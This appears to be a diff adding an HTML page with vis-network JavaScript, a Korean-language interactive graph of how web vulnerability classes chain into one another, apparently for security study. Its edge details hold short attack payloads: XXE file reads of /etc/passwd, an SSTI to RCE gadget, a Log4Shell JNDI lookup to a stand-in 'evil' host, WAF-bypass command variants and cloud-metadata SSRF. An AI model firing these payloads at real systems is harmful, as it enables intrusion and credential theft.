@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Attack Chaining Graph — the-map</title>
+<script src="https://unpkg.com/vis-network@9.1.6/standalone/umd/vis-network.min.js"></script>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
+  #graph{width:100vw;height:100vh}
+
+  .panel{position:fixed;background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px 18px;z-index:10;box-shadow:0 4px 24px rgba(0,0,0,.4);font-size:12px;max-height:calc(100vh - 32px);overflow-y:auto}
+  .panel::-webkit-scrollbar{width:4px}
+  .panel::-webkit-scrollbar-thumb{background:#30363d;border-radius:4px}
+  .panel h2{font-size:13px;color:#f0f6fc;margin-bottom:10px;font-weight:600}
+  .sep{margin:8px 0;border-top:1px solid #30363d}
+
+  /* Legend */
+  #legend{top:16px;left:16px;width:200px}
+  .leg-item{display:flex;align-items:center;margin-bottom:5px}
+  .leg-dot{width:10px;height:10px;border-radius:50%;margin-right:7px;flex-shrink:0}
+
+  /* Filter */
+  #filter{top:16px;left:228px;width:210px}
+  .f-row{display:flex;align-items:center;margin-bottom:5px;cursor:pointer;user-select:none}
+  .f-row:hover{color:#f0f6fc}
+  .f-line{width:22px;height:3px;border-radius:2px;margin-right:7px;flex-shrink:0}
+  .f-line.dashed{background:repeating-linear-gradient(90deg,var(--c) 0,var(--c) 4px,transparent 4px,transparent 8px)}
+  .f-check{margin-left:auto;color:#58a6ff;font-size:14px}
+  .f-row.off{opacity:.35}
+  .f-row.off .f-check{visibility:hidden}
+  .f-count{margin-left:4px;color:#8b949e;font-size:11px}
+
+  /* Stats */
+  #stats{top:16px;right:16px;width:230px}
+  .s-row{display:flex;justify-content:space-between;margin-bottom:4px}
+  .s-label{color:#8b949e}.s-val{color:#58a6ff;font-weight:600}
+  .s-section{margin-top:8px;padding-top:6px;border-top:1px solid #30363d}
+  .s-title{font-size:10px;color:#6e7681;text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px}
+
+  /* Info */
+  #info{position:fixed;bottom:16px;left:16px;right:16px;max-width:680px;background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px 18px;z-index:10;display:none;box-shadow:0 4px 24px rgba(0,0,0,.4)}
+  #info h3{font-size:13px;color:#58a6ff;margin-bottom:5px}
+  #info p{font-size:12px;line-height:1.5;color:#8b949e}
+  #info .el{color:#f0f6fc;font-weight:600}
+
+  /* Title bar */
+  #titlebar{position:fixed;bottom:16px;right:16px;background:#161b22;border:1px solid #30363d;border-radius:10px;padding:10px 16px;z-index:10;font-size:11px;color:#6e7681;text-align:right}
+  #titlebar b{color:#c9d1d9;font-size:12px;display:block;margin-bottom:2px}
+</style>
+</head>
+<body>
+
+<div id="graph"></div>
+
+<!-- Node category legend -->
+<div id="legend" class="panel">
+  <h2>노드 카테고리</h2>
+  <div class="leg-item"><span class="leg-dot" style="background:#FF6B6B"></span>Encoding / Parser</div>
+  <div class="leg-item"><span class="leg-dot" style="background:#4ECDC4"></span>Injection</div>
+  <div class="leg-item"><span class="leg-dot" style="background:#45B7D1"></span>Auth / Identity</div>
+  <div class="leg-item"><span class="leg-dot" style="background:#96CEB4"></span>HTTP Protocol</div>
+  <div class="leg-item"><span class="leg-dot" style="background:#FFEAA7"></span>Server-Side</div>
+  <div class="leg-item"><span class="leg-dot" style="background:#DDA0DD"></span>Client-Side</div>
+  <div class="leg-item"><span class="leg-dot" style="background:#C9B1FF"></span>Application Logic</div>
+  <div class="leg-item"><span class="leg-dot" style="background:#FFB347"></span>Infrastructure</div>
+  <div class="sep"></div>
+  <div style="color:#6e7681;font-size:11px;line-height:1.4">
+    클릭: 연결 하이라이트<br>
+    엣지 클릭: 상세 기법<br>
+    더블클릭: 줌인<br>
+    빈 곳 클릭: 초기화
+  </div>
+</div>
+
+<!-- Edge pattern filter -->
+<div id="filter" class="panel">
+  <h2>엣지 유형 필터</h2>
+  <div id="filter-list"></div>
+</div>
+
+<!-- Stats -->
+<div id="stats" class="panel">
+  <h2>그래프 통계</h2>
+  <div class="s-row"><span class="s-label">노드</span><span class="s-val" id="nc">-</span></div>
+  <div class="s-row"><span class="s-label">엣지</span><span class="s-val" id="ec">-</span></div>
+  <div class="s-section"><div class="s-title">공격 허브 Top 7 (총 연결)</div><div id="hub"></div></div>
+  <div class="s-section"><div class="s-title">최다 피격 대상 Top 7 (In-degree)</div><div id="tgt"></div></div>
+  <div class="s-section"><div class="s-title">최다 공격 기원 Top 7 (Out-degree)</div><div id="src"></div></div>
+</div>
+
+<div id="info"><h3 id="it"></h3><p id="ib"></p></div>
+
+<div id="titlebar">
+  <b>the-map: Attack Chaining Graph</b>
+  전체 취약점 클래스 간 A→B 공격 체이닝 관계 시각화
+</div>
+
+<script>
+// ═══════════════════════════════════════
+// COLOR PALETTES
+// ═══════════════════════════════════════
+const NC={
+  encoding: {bg:'#FF6B6B',br:'#E05555',hi:'#FF8A8A',ft:'#1a0000'},
+  injection:{bg:'#4ECDC4',br:'#3BB5AD',hi:'#6FE0D9',ft:'#002220'},
+  auth:     {bg:'#45B7D1',br:'#339DB5',hi:'#68C9DF',ft:'#001a24'},
+  protocol: {bg:'#96CEB4',br:'#7FB89D',hi:'#AEDbc5',ft:'#0a1f14'},
+  server:   {bg:'#FFEAA7',br:'#E5D18F',hi:'#FFF0BF',ft:'#2a2200'},
+  client:   {bg:'#DDA0DD',br:'#C58BC5',hi:'#EABAEA',ft:'#240024'},
+  logic:    {bg:'#C9B1FF',br:'#B199E8',hi:'#DBC9FF',ft:'#0f0033'},
+  infra:    {bg:'#FFB347',br:'#E59B30',hi:'#FFC56E',ft:'#2a1800'}
+};
+const EC={
+  parser:    {color:'#FF6B6B',label:'파서 차분 (Parser Differential)',w:2.2},
+  encoding:  {color:'#FFD93D',label:'인코딩 어댑터 (Encoding Bridge)',w:2.2},
+  cache:     {color:'#FFB347',label:'캐시 증폭 (Cache Amplification)',w:2.2},
+  temporal:  {color:'#C9B1FF',label:'시간적 조작 (Temporal)',w:2.2},
+  trust:     {color:'#96CEB4',label:'신뢰 경계 붕괴 (Trust Boundary)',w:2.2},
+  escalation:{color:'#484f58',label:'직접 에스컬레이션 (Classic Chain)',w:1.2},
+  enable:    {color:'#2d333b',label:'페이로드 전달 (Enabler)',w:1.0,dash:true},
+};
+
+// ═══════════════════════════════════════
+// NODES
+// ═══════════════════════════════════════
+function N(id,label,g){
+  const c=NC[g];
+  return{id,label,group:g,color:{background:c.bg,border:c.br,highlight:{background:c.hi,border:'#fff'}},
+    font:{color:c.ft,size:12,face:'Segoe UI,system-ui,sans-serif'},borderWidth:2,shape:'box',
+    margin:{top:7,bottom:7,left:10,right:10},shadow:{enabled:true,color:'rgba(0,0,0,.25)',size:5,x:1,y:1}};
+}
+const nodeArr=[
+  // 06 encoding-parser
+  N('url_confusion','URL Confusion','encoding'),
+  N('unicode','Unicode','encoding'),
+  N('type_confusion','Type Confusion','encoding'),
+  N('zip_archive','ZIP Archive','encoding'),
+  // 01 injection
+  N('xss','XSS','injection'),
+  N('ssti','SSTI','injection'),
+  N('proto_pollution','Prototype\nPollution','injection'),
+  N('cmd_injection','Command\nInjection','injection'),
+  N('xxe','XXE','injection'),
+  N('sqli','SQL Injection','injection'),
+  N('nosqli','NoSQL\nInjection','injection'),
+  N('graphql','GraphQL','injection'),
+  N('ssi_esi','SSI / ESI\n/ XSLT','injection'),
+  // 02 auth
+  N('jwt','JWT','auth'),
+  N('oauth','OAuth','auth'),
+  N('saml','SAML','auth'),
+  N('csrf','CSRF','auth'),
+  N('cors','CORS','auth'),
+  N('mass_assignment','Mass\nAssignment','auth'),
+  N('idor','IDOR','auth'),
+  N('cookie','Cookie','auth'),
+  N('account_takeover','Account\nTakeover','auth'),
+  // 03 protocol
+  N('smuggling','HTTP\nSmuggling','protocol'),
+  N('reverse_proxy','Reverse\nProxy','protocol'),
+  N('http_header','HTTP Header','protocol'),
+  N('hpp','HPP','protocol'),
+  N('websocket','WebSocket','protocol'),
+  N('dns','DNS','protocol'),
+  // 04 server-side
+  N('ssrf','SSRF','server'),
+  N('path_traversal','Path\nTraversal','server'),
+  N('file_upload','File Upload','server'),
+  N('deserialization','Deserialization','server'),
+  // 05 client-side
+  N('open_redirect','Open\nRedirect','client'),
+  N('dom_clobbering','DOM\nClobbering','client'),
+  N('ui_redressing','UI Redressing\n(Clickjacking)','client'),
+  // 07 logic
+  N('race_condition','Race\nCondition','logic'),
+  N('secondary_ctx','Secondary\nContext','logic'),
+  N('implicit_trust','Implicit\nTrust','logic'),
+  N('business_logic','Business\nLogic','logic'),
+  // 08 infra
+  N('cache_poisoning','Cache\nPoisoning','infra'),
+  N('waf_bypass','WAF Bypass','infra'),
+];
+
+// ═══════════════════════════════════════
+// EDGES  [from, to, pattern, label, detail]
+// ═══════════════════════════════════════
+const edgeArr=[
+
+// ── Encoding/Parser origins ──────────────────────
+['url_confusion','jwt','parser','@트릭 / DNS Rebinding jku',
+  '@: https://trusted.com@evil.com/jwks.json → 검증 파서 vs fetch 파서 호스트 불일치\nDNS Rebinding: jku URL의 TTL=0 → 검증 시 외부IP, fetch 시 내부IP'],
+['url_confusion','oauth','parser','redirect_uri 파서 차분',
+  '@트릭, dot-segment(/../), fragment(#@) 3가지 벡터로 redirect_uri 검증 우회'],
+['url_confusion','ssrf','parser','IP 표현 난독화',
+  '127.0.0.1 = 2130706433(DWORD) = 0x7f000001(Hex) = 0177.0.1(Oct) = [::ffff:127.0.0.1]'],
+['url_confusion','cors','encoding','이중 인코딩 Origin',
+  'Origin: https://trusted%2ecom%2eevil.com → 디코딩 전 정규식 매칭으로 우회'],
+
+['unicode','saml','encoding','NFKC NameID / ZWSP Comment',
+  '터키어 ı(U+0131)로 admın 등록 → NFKC 비교 시 admin과 충돌\nZWSP(U+200B)로 Comment Injection 탐지 회피'],
+['unicode','cors','encoding','Homoglyph Origin',
+  '키릴 а로 exаmple.com 등록 → 시각적 매칭, 실제 다른 도메인'],
+['unicode','cmd_injection','encoding','Best-Fit (CVE-2024-4577)',
+  '소프트 하이픈(U+00AD) → Windows ANSI 변환 → 하이픈(0x2D) → PHP-CGI -d RCE'],
+['unicode','xxe','encoding','BOM 인코딩 전환',
+  'UTF-16 BOM → WAF UTF-8 검사(키워드 불일치) / XML파서 UTF-16 디코딩(XXE 실행)'],
+['unicode','ssrf','encoding','전각/제로폭 필터 우회',
+  'http://１２７．０．０．１/ → NFKC 후 127.0.0.1\nlocal\\u200Bhost → ZWSP 제거 → localhost'],
+['unicode','waf_bypass','encoding','NFKC/전각 키워드 변환',
+  '전각 ASCII(U+FF01~FF5E)가 WAF 키워드 매칭 우회, 백엔드 정규화 후 원래 문자로 복원'],
+['unicode','xss','encoding','인코딩 차분 필터 우회',
+  'UTF-7, charset mismatch, multi-byte escape eating으로 XSS 필터 우회'],
+
+['type_confusion','jwt','parser','JSON 중복키 / PHP 타입강제',
+  '{"role":"user","role":"admin"} first/last wins\n{"sub":true} PHP == "any" = true\n정수 2^53+1 JS 정밀도 손실 vs Python 정확'],
+['type_confusion','xxe','parser','Content-Type 전환',
+  'JSON 엔드포인트에 Content-Type: application/xml → XML 파서 활성화 → XXE'],
+['type_confusion','saml','parser','xsi:type 알고리즘 혼동',
+  'xsi:type 속성으로 SignatureMethod 타입 런타임 재정의 → 알고리즘 검증 우회'],
+['type_confusion','nosqli','parser','JSON 타입 → 연산자 주입',
+  '{"password":{"$gt":""}} → MongoDB 연산자로 해석되어 인증 우회'],
+
+['zip_archive','xxe','parser','LFH/CDH 인덱스 차분',
+  'DOCX=ZIP. LFH에 정상 XML, CDH에 XXE → 스캐너 LFH(정상), 파서 CDH(XXE)'],
+['zip_archive','file_upload','parser','Polyglot / Zip Slip',
+  'GIF89a+__HALT_COMPILER 폴리글롯, filename 경로순회로 업로드 디렉토리 탈출'],
+['zip_archive','path_traversal','parser','Zip Slip 경로순회',
+  '아카이브 내 파일명에 ../../ 포함 → 추출 시 상위 디렉토리에 파일 기록'],
+
+// ── Injection origins ────────────────────────────
+['xss','csrf','escalation','임의 요청 실행',
+  'XSS로 피해자 브라우저에서 인증된 상태 변경 요청 강제 실행'],
+['xss','oauth','escalation','토큰 탈취 (DOM/쿠키)',
+  'OAuth 토큰이 URL fragment, 쿠키, DOM에 노출되면 XSS로 탈취'],
+['xss','jwt','escalation','localStorage 토큰 탈취',
+  'localStorage에 저장된 JWT를 document.cookie나 fetch로 외부 전송'],
+['xss','account_takeover','escalation','세션 하이재킹',
+  '세션 쿠키 탈취 또는 비밀번호 변경 폼 자동 제출로 계정 탈취'],
+['xss','cookie','escalation','쿠키 탈취/설정',
+  'document.cookie 읽기 + Set-Cookie 동등 동작으로 세션 조작'],
+['xss','cache_poisoning','cache','Service Worker 영속성',
+  'XSS → SW 등록 → Cache API로 모든 리소스 악성 교체. 서버 수정 후에도 ~40일 영속'],
+['xss','waf_bypass','encoding','mXSS / Cookie Sandwich',
+  'mXSS: 안전한 HTML이 브라우저 재파싱에서 XSS로 변이\nCookie Sandwich: 쿠키로 WAF 컨텍스트 조작'],
+
+['ssti','cmd_injection','escalation','샌드박스 탈출 → OS 명령',
+  'Python MRO __subclasses__() → Popen, Java Runtime.exec(), PHP system()'],
+['ssti','path_traversal','escalation','템플릿 파일 읽기',
+  'Jinja2 open(), Twig source(), FreeMarker ?eval로 서버 파일 읽기'],
+['ssti','xss','escalation','템플릿 출력 주입',
+  '템플릿 렌더링 결과에 스크립트 태그 삽입 → Reflected/Stored XSS'],
+
+['proto_pollution','xss','escalation','DOM 가젯 / Sanitizer 우회',
+  'innerHTML 가젯: Object.prototype.innerHTML = payload\nDOMPurify 설정 오염으로 sanitizer 우회'],
+['proto_pollution','ssti','escalation','EJS outputFunctionName',
+  'Object.prototype.outputFunctionName = "x;process.mainModule..." → EJS 컴파일 시 RCE'],
+['proto_pollution','cmd_injection','escalation','child_process 가젯',
+  'Object.prototype.shell = true, .env.NODE_OPTIONS = "--require=malicious"'],
+['proto_pollution','jwt','trust','검증 옵션 오염',
+  'Object.prototype.algorithms=["none"] → jwt.verify()가 alg:none 허용'],
+['proto_pollution','cache_poisoning','trust','런타임 헤더 오염',
+  'Object.prototype["X-Forwarded-Host"]="evil" → 모든 응답에서 헤더 참조 → 전역 오염'],
+
+['xxe','ssrf','escalation','외부 엔티티 HTTP 요청',
+  '<!ENTITY x SYSTEM "http://internal:8080/api"> → 내부 서비스 접근'],
+['xxe','path_traversal','escalation','file:// 프로토콜',
+  '<!ENTITY x SYSTEM "file:///etc/passwd"> → 로컬 파일 읽기'],
+['xxe','deserialization','escalation','CVE-2024-34102 XMLDecoder',
+  'Magento CVSS 9.8: XXE → XMLDecoder 역직렬화 체인 → RCE'],
+
+['sqli','cmd_injection','escalation','xp_cmdshell / sys_exec',
+  'MSSQL xp_cmdshell, MySQL sys_exec(), PostgreSQL COPY TO PROGRAM'],
+['sqli','path_traversal','escalation','LOAD_FILE / INTO OUTFILE',
+  'MySQL LOAD_FILE() 읽기, INTO OUTFILE 쓰기 → 웹셸 기록'],
+['sqli','account_takeover','escalation','인증 우회 + 데이터 탈취',
+  "' OR 1=1 -- 인증 우회, UNION SELECT로 크레덴셜 탈취"],
+
+['nosqli','account_takeover','escalation','$gt 연산자 인증 우회',
+  '{"password":{"$gt":""}} → 모든 비밀번호보다 큰 값 → 인증 통과'],
+
+['graphql','mass_assignment','escalation','Introspection → 필드 주입',
+  '__schema 쿼리로 숨겨진 필드(role, isAdmin) 발견 → mutation에 포함'],
+['graphql','idor','escalation','Introspection → ID 열거',
+  'node(id: "...") 패턴으로 다른 사용자 객체 접근'],
+['graphql','sqli','escalation','중첩 리졸버 쿼리',
+  '리졸버가 SQL 조립 시 입력 미이스케이프 → 중첩 쿼리로 SQLi'],
+['graphql','ssrf','escalation','Federation 쿼리',
+  '서브그래프 URL 조작 또는 @requires로 내부 서비스 접근'],
+
+['ssi_esi','xss','escalation','Include → HTML 렌더링',
+  'ESI include → 외부 HTML 삽입 → 피해자 브라우저에서 렌더링'],
+['ssi_esi','ssrf','escalation','ESI include URL fetch',
+  '<esi:include src="http://internal/"> → 서버 측 URL fetch'],
+['ssi_esi','cmd_injection','escalation','SSI exec 명령 실행',
+  '<!--#exec cmd="id"--> → OS 명령 직접 실행'],
+
+// ── Auth origins ─────────────────────────────────
+['oauth','account_takeover','escalation','토큰 탈취 → 계정 접근',
+  '인가코드/액세스 토큰 탈취 시 피해자 계정으로 API 접근'],
+['oauth','ssrf','escalation','Dynamic Registration URI',
+  'logo_uri, jwks_uri, sector_identifier_uri → 서버 측 URL fetch'],
+['oauth','open_redirect','escalation','redirect_uri 외부 리다이렉트',
+  '인가 서버가 redirect_uri로 302 → 토큰이 공격자 서버로 전달'],
+
+['saml','account_takeover','escalation','ID 스푸핑',
+  'XSW, Comment Injection, NameID 조작으로 다른 사용자로 인증'],
+['saml','xxe','escalation','SAML XML 파싱',
+  'SAML Response/Assertion이 XML → XXE 벡터 (S5-1)'],
+
+['csrf','oauth','escalation','강제 인가/토큰 교환',
+  'state 파라미터 부재 시 공격자의 인가코드를 피해자에게 바인딩'],
+['csrf','account_takeover','escalation','상태 변경 강제',
+  '비밀번호 변경, 이메일 변경 등 계정 관리 동작 강제 실행'],
+
+['cors','csrf','escalation','SameSite 우회',
+  'CORS misconfiguration + 인증 쿠키 포함 → 교차 출처 인증 요청'],
+['cors','account_takeover','escalation','교차 출처 데이터 탈취',
+  'ACAO with credentials → fetch()로 피해자 데이터 읽기'],
+
+['mass_assignment','account_takeover','escalation','role/권한 덮어쓰기',
+  '{"role":"admin"} 또는 {"isVerified":true} → 권한 상승'],
+['mass_assignment','proto_pollution','escalation','JSON merge 진입점',
+  'Mass Assignment 가능한 엔드포인트 = PP 진입점 후보. {"__proto__":{"x":"y"}}'],
+
+['idor','account_takeover','escalation','타 사용자 데이터 접근',
+  '/api/users/123 → /api/users/456 으로 ID 변경 → 다른 사용자 데이터'],
+
+['cookie','csrf','trust','Cookie Tossing + SameSite',
+  '서브도메인에서 Set-Cookie Domain=.target.com → SameSite=Lax도 same-site로 통과'],
+['cookie','xss','escalation','쿠키 기반 XSS 반사',
+  '쿠키 값이 페이지에 반영될 때 스크립트 주입 → Stored-like XSS'],
+['cookie','account_takeover','escalation','세션 고정',
+  '피해자에게 공격자의 세션 ID를 강제 설정 → 피해자 로그인 후 세션 공유'],
+
+['jwt','account_takeover','escalation','위조 토큰 → 계정 접근',
+  'alg:none, 키 혼동, jku 주입 등으로 임의 claim의 유효 토큰 생성'],
+
+// ── HTTP Protocol origins ────────────────────────
+['smuggling','file_upload','parser','first/last wins, line folding',
+  'filename 중복 → WAF first(safe.jpg), 백엔드 last(shell.php)\nline folding → filename 은닉'],
+['smuggling','cache_poisoning','cache','CL.0 / HEAD 큐 시프트',
+  'CL.0: POST 본문이 다음 요청으로 → CDN 오염\nHEAD: CL 헤더만 반환 → 응답 큐 전체 시프트'],
+['smuggling','ssrf','trust','H2 CRLF 클라우드 메타데이터',
+  'H2 헤더값 \\r\\nMetadata:true → H2→H1 변환 → Azure/GCP/AWS 메타데이터 헤더 요구 우회'],
+['smuggling','deserialization','temporal','Expect / Chunk Extension',
+  'Expect:100-continue → WAF 헤더만 검사, 본문 미검사\nTERM.SPILL: 과대 청크로 WAF 범위 밖 배치'],
+['smuggling','xss','escalation','Response Splitting',
+  '스머글링된 요청의 응답이 다음 사용자 응답에 삽입 → 스크립트 주입'],
+['smuggling','account_takeover','escalation','Front-end 인증 우회',
+  '프론트엔드 인증 후 스머글링된 요청은 인증 없이 백엔드 도달'],
+
+['reverse_proxy','ssrf','parser','세미콜론 / 이중디코딩',
+  '/safe/..;/admin → Tomcat 세미콜론 제거 → ../admin\n%252e%252e → 검증 1회(%2e%2e), 백엔드 2회(../)'],
+['reverse_proxy','file_upload','parser','인코딩 차분 경로순회',
+  'filename=%2e%2e%2fshell.php → 검증: 안전 / 파일시스템: ../shell.php'],
+['reverse_proxy','path_traversal','parser','정규화 차분 ACL 우회',
+  'Nginx /admin 차단 → /app/..%2fadmin → Nginx 통과, Spring ../admin 해석'],
+['reverse_proxy','account_takeover','escalation','경로 기반 인증 우회',
+  '프록시 ACL 우회로 인증 필요 경로에 직접 접근'],
+
+['http_header','xss','escalation','CRLF → Response Splitting',
+  'Header: value\\r\\n\\r\\n<script> → 응답 분할 → 스크립트 주입'],
+['http_header','cache_poisoning','cache','unkeyed 헤더',
+  'X-Forwarded-Host, X-Forwarded-Scheme 등 캐시 키 미포함 헤더로 응답 조작'],
+['http_header','ssrf','escalation','Host 헤더 라우팅 혼동',
+  'Host: internal-api → 리버스 프록시가 내부 서비스로 라우팅'],
+['http_header','account_takeover','escalation','X-Forwarded-For 신뢰',
+  'IP 기반 인증을 X-Forwarded-For 스푸핑으로 우회'],
+
+['hpp','oauth','parser','redirect_uri 중복',
+  '?redirect_uri=safe&redirect_uri=evil → 서버/프레임워크별 선택 다름'],
+['hpp','waf_bypass','parser','파라미터 분할',
+  'payload를 여러 파라미터에 분산 → 개별 파라미터는 WAF 시그니처 미매칭'],
+
+['websocket','csrf','escalation','CSWSH',
+  'Cross-Site WebSocket Hijacking: Origin 미검증 시 공격자 페이지에서 WS 연결'],
+['websocket','xss','escalation','메시지 인젝션',
+  'WebSocket 메시지가 DOM에 삽입될 때 스크립트 주입'],
+
+['dns','ssrf','temporal','DNS Rebinding',
+  'TTL=0 → 검증 시 외부IP, fetch 시 내부IP. rbndr.us로 자동화'],
+['dns','cors','temporal','DNS Rebinding Origin',
+  '공격자 도메인 DNS를 대상 IP로 rebind → same-origin으로 인식되어 CORS 우회'],
+
+// ── Server-Side origins ──────────────────────────
+['ssrf','deserialization','escalation','내부 역직렬화 엔드포인트',
+  '내부 네트워크의 Java RMI, Redis, Memcached 등에 직렬화 페이로드 전송'],
+['ssrf','path_traversal','escalation','file:// 로컬 파일',
+  'file:///etc/passwd, file:///proc/self/environ 등 로컬 파일 읽기'],
+['ssrf','account_takeover','escalation','클라우드 메타데이터 → IAM',
+  '169.254.169.254 → IAM 크레덴셜 → AWS/GCP/Azure 전체 접근'],
+
+['file_upload','deserialization','trust','PHAR 폴리글롯',
+  'GIF89a+__HALT_COMPILER()+POP chain → 이미지 검증 통과, phar:// 접근 시 RCE'],
+['file_upload','xss','escalation','SVG/HTML 업로드',
+  'SVG <script> 또는 HTML 파일 업로드 → 같은 오리진에서 스크립트 실행'],
+['file_upload','ssrf','escalation','SVG xlink:href',
+  '<image xlink:href="http://internal/"> → 서버 측 SVG 렌더링 시 URL fetch'],
+['file_upload','cmd_injection','escalation','ImageMagick delegate',
+  'ImageMagick MVG/SVG delegate를 통한 OS 명령 실행 (ImageTragick)'],
+['file_upload','path_traversal','escalation','filename 경로순회',
+  '../../../var/www/html/shell.php → 업로드 디렉토리 외부에 기록'],
+
+['deserialization','cmd_injection','escalation','가젯 체인 RCE',
+  'ysoserial Commons Collections, TemplatesImpl → Runtime.exec()'],
+['deserialization','ssrf','escalation','JNDI Lookup',
+  'Log4Shell 패턴: ${jndi:ldap://evil/} → 외부 LDAP/RMI 서버 접근'],
+['deserialization','xxe','escalation','XMLDecoder 체인',
+  'Java XMLDecoder, .NET XmlSerializer → XML 파싱 중 XXE 발생'],
+
+['path_traversal','open_redirect','encoding','Unicode 전각 ../ 우회',
+  '전각 마침표(U+FF0E)+슬래시(U+FF0F) → NFKC 후 ../ → 리다이렉트 검증 우회'],
+['path_traversal','account_takeover','escalation','설정/크레덴셜 읽기',
+  '/etc/shadow, .env, config/database.yml 등 크레덴셜 파일 직접 읽기'],
+
+// ── Client-Side origins ──────────────────────────
+['open_redirect','ssrf','trust','allowed domain 리다이렉트',
+  'SSRF → allowed.com/redirect?url=169.254.169.254 → 필터 통과 → 메타데이터'],
+['open_redirect','xss','escalation','javascript: DOM sink',
+  'location.href = url → url이 javascript:alert(1) → DOM-based XSS'],
+['open_redirect','oauth','escalation','토큰 탈취 리다이렉트',
+  'OAuth redirect_uri에 오픈 리다이렉트 URL 삽입 → 토큰이 공격자 서버로'],
+
+['dom_clobbering','xss','escalation','스크립트 소스 조작',
+  '<a id="config" href="evil.com/"> → window.config.href로 스크립트 URL 변경'],
+
+['ui_redressing','csrf','escalation','클릭재킹 → 폼 제출',
+  '투명 iframe으로 피해자 클릭을 삭제/전송 버튼으로 유도'],
+['ui_redressing','oauth','escalation','동의 클릭 하이재킹',
+  'OAuth 동의 화면을 투명 overlay로 덮어 피해자가 무의식적으로 승인'],
+
+// ── Application Logic origins ────────────────────
+['race_condition','cache_poisoning','temporal','invalidation race',
+  'TTL 만료 시점에 single-packet으로 오염 요청 → 캐시 재충전 race 승리'],
+['race_condition','oauth','temporal','인가코드 다중 교환',
+  '1회용 코드를 single-packet 20개 동시 교환 → "사용완료" 마킹 전 다수 성공'],
+['race_condition','file_upload','temporal','업로드-검증 윈도우',
+  '업로드~삭제 사이 race window에 GET → 웹셸 실행'],
+['race_condition','mass_assignment','temporal','객체 초기화 윈도우',
+  'User 생성 + role 변경 동시 → 기본 role 설정 전 admin 덮어쓰기'],
+['race_condition','idor','temporal','비즈니스 로직 race',
+  '잔액 확인~차감 사이 race → 이중 출금, 쿠폰 다중 사용'],
+['race_condition','account_takeover','temporal','MFA/Rate Limit 우회',
+  'single-packet으로 MFA 코드 브루트포스 또는 로그인 rate limit 우회'],
+
+['secondary_ctx','waf_bypass','parser','프록시-백엔드 정규화',
+  'Nginx ACL ≠ Spring 라우팅. /app/..%2fadmin → Nginx 통과, Spring 해석'],
+['secondary_ctx','oauth','trust','BFF URL 파라미터 주입',
+  'BFF가 callback을 내부 URL에 미이스케이프 삽입 → redirect_uri 주입'],
+['secondary_ctx','cmd_injection','parser','프로토콜 간 컨텍스트 전환',
+  'HTTP → 내부 API → Shell. 각 경계에서 이스케이프 규칙 불일치'],
+
+['implicit_trust','cache_poisoning','trust','CDN 바이패스',
+  'Shodan으로 오리진 IP 발견 → CDN 우회 직접 접근 → 헤더 주입 보호 무력화'],
+['implicit_trust','proto_pollution','trust','공급망 가젯 전파',
+  'npm 메인테이너 탈취 → deep-merge 라이브러리에 PP 가젯 → 다운스트림 전파'],
+['implicit_trust','oauth','trust','Confused Deputy / Zombie Token',
+  'AWS 역할 가정 → OAuth 토큰 열거 → 비밀번호 변경 후 90일+ 유효'],
+['implicit_trust','ssrf','trust','클라우드 메타데이터 신뢰',
+  '내부 네트워크에서 169.254.169.254 접근 제한 없음 → SSRF 시 즉시 크레덴셜 탈취'],
+['implicit_trust','account_takeover','trust','마이크로서비스 신뢰',
+  '내부 API가 인증 없이 동작 → SSRF로 내부 도달 시 직접 계정 조작'],
+
+['business_logic','idor','escalation','로직 결함 ID 조작',
+  '워크플로우 순서 건너뛰기, 상태 전이 조작으로 타 사용자 리소스 접근'],
+['business_logic','mass_assignment','escalation','상태 전이 우회',
+  '주문 상태를 "결제완료"로 직접 변경, 승인 없이 단계 건너뛰기'],
+['business_logic','account_takeover','escalation','워크플로우 우회',
+  '비밀번호 재설정 플로우 조작, 이메일 인증 건너뛰기'],
+
+// ── Infrastructure origins ───────────────────────
+['cache_poisoning','xss','cache','unkeyed 헤더 스크립트 주입',
+  'X-Forwarded-Host → <script src="evil.com/"> → CDN 캐싱 → 모든 사용자 XSS'],
+['cache_poisoning','path_traversal','cache','X-Original-URL 소스 유출',
+  'GET /static/x.css + X-Original-URL:/../config.yml → CDN에 설정 파일 캐싱'],
+['cache_poisoning','open_redirect','cache','파라미터 클로킹',
+  '세미콜론 구분자 차분: url=safe&utm=x;url=evil → CDN 제외, 백엔드 추출'],
+['cache_poisoning','account_takeover','cache','Cache Deception 크레덴셜',
+  '/account/settings.css → CDN 정적 캐싱 → 피해자 프로필/토큰이 캐시에 저장'],
+
+['waf_bypass','sqli','enable','SQL 페이로드 전달',
+  '인코딩/주석/대소문자 변환으로 SQL WAF 규칙 우회 → SQLi 페이로드 도달'],
+['waf_bypass','xss','enable','XSS 페이로드 전달',
+  '이벤트 핸들러 변형, 태그 변형, 인코딩 조합으로 XSS WAF 규칙 우회'],
+['waf_bypass','cmd_injection','enable','명령 페이로드 전달',
+  '와일드카드(cat /etc/pas?wd), IFS, 변수 치환으로 명령어 WAF 우회'],
+['waf_bypass','xxe','enable','XXE 페이로드 전달',
+  'UTF-16/EBCDIC 인코딩, 파라미터 엔티티, 외부 DTD로 XXE WAF 우회'],
+['waf_bypass','deserialization','enable','역직렬화 페이로드 전달',
+  'Base64 다중 인코딩, GZip 압축, 청크 분할로 시그니처 매칭 우회'],
+];
+
+// ═══════════════════════════════════════
+// BUILD VIS DATA
+// ═══════════════════════════════════════
+const nodes = new vis.DataSet(nodeArr);
+const patternCounts = {};
+Object.keys(EC).forEach(k=>patternCounts[k]=0);
+
+const edgesData = edgeArr.map((e,i)=>{
+  const p=e[2], ec=EC[p];
+  patternCounts[p]++;
+  return {
+    id:i, from:e[0], to:e[1], _pattern:p,
+    label:e[3], _detail:e[4],
+    arrows:{to:{enabled:true,scaleFactor:.6,type:'arrow'}},
+    color:{color:ec.color,highlight:'#f0f6fc',hover:ec.color,opacity: p==='enable'?.4 : p==='escalation'?.55 : .85},
+    font:{color:ec.color,size: (p==='escalation'||p==='enable') ? 0 : 9, strokeWidth:3,strokeColor:'#0d1117',align:'top'},
+    smooth:{type:'curvedCW',roundness: .12 + (i%5)*.03},
+    width:ec.w, hoverWidth:.3, selectionWidth:.8,
+    dashes: ec.dash ? [6,4] : false,
+    hidden:false,
+  };
+});
